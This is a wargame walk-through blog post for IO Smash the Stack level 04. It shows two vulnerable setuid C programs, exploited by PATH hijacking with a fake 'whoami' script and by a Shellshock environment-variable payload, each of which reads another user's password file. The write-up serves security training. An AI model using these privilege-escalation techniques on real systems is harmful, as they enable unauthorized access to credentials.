+++
title = "IO Smash the stack level 04"
date = "2016-01-26T10:48:00-02:00"
publishdate = "2016-01-26"
categories =["Security"]
tags = ["Wargames", "C"]
slug = "io-smashthestack-level-04"
project_url = "https://greyhat.dk/io-smashthestack-level-04"
type = "post"
description = "Walk-through"
image = "binary.png"
image_alt = "Binary pattern"
+++

## Level04

```sh
level4@io:/levels$ ls -latr level04*
-r-sr-x--- 1 level5 level4 5159 Dec 18  2013 level04
-r-------- 1 level4 level4  245 Dec 18  2013 level04.c
-r-sr-x--- 1 level5 level4 5105 Sep 24  2014 level04_alt
-r-------- 1 level4 level4  120 Jan 27  2015 level04_alt.c
```

level4@io:/levels$ cat level04.c
```c
//writen by bla
#include <stdlib.h>
#include <stdio.h>

int main() {
        char username[1024];
        FILE* f = popen("whoami","r");
        fgets(username, sizeof(username), f);
        printf("Welcome %s", username);

        return 0;
}
```

So it runs whoami without full path .. lets see if we can make it run our version of whoami

```sh
level4@io:~$ mkdir /tmp/desdic
level4@io:~$ cd /tmp/desdic
level4@io:/tmp/desdic$ echo "cat /home/level5/.pass" > whoami
level4@io:/tmp/desdic$ chmod 777 whoami
level4@io:/tmp/desdic$ ./whoami
cat: /home/level5/.pass: Permission denied
level4@io:/tmp/desdic$ export PATH=.:$PATH
level4@io:/tmp/desdic$ which whoami
./whoami
level4@io:/tmp/desdic$ /levels/level04
Welcome XXXXXXXXXXXXXXXX
```


## Level04 alt

level4@io:/tmp/desdic$ cat /levels/level04_alt.c
```c
//written by bla
#include <stdlib.h>
int main(){
	setresuid(geteuid(), geteuid(), geteuid());
	system("/usr/bin/id");
}
```

Tried some old tricks using IFS to split the system call into usr bin id but it never worked. So I tried shellshock

```sh
level4@io:/tmp/d$ env x='() { :;}; cat /home/level5/.pass' /levels/level04_alt
XXXXXXXXXXXXXXXX
```
